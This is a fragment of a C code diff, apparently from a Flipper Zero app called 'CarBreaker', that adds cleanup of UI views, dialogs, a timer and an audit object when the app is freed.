+        app->view_dispatcher, CarBreakerViewKnownDetail, dialog_ex_get_view(app->known_dialog));
+
     app->about_view = car_breaker19_scene_about_alloc();
     view_set_previous_callback(app->about_view, car_breaker_view_previous_callback);
     view_dispatcher_add_view(app->view_dispatcher, CarBreakerViewAbout, app->about_view);
@@ -1172,8 +1876,23 @@ static void car_breaker_free(CarBreakerApp* app) {
     car_breaker_stop_capture(app);
 
     if(app->ui_timer) {
+        furi_timer_stop(app->ui_timer);
         furi_timer_free(app->ui_timer);
     }
+
+    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewKnownDetail);
+    dialog_ex_free(app->known_dialog);
+
+    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewKnown);
+    submenu_free(app->known_menu);
+
+    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewAudit);
+    dialog_ex_free(app->audit_dialog);
+
+    view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewAuditSelect);
+    submenu_free(app->audit_menu);
+
+    car_breaker_audit_free(app->audit);
 
     view_dispatcher_remove_view(app->view_dispatcher, CarBreakerViewAbout);
     car_breaker19_scene_about_free(app->about_view);
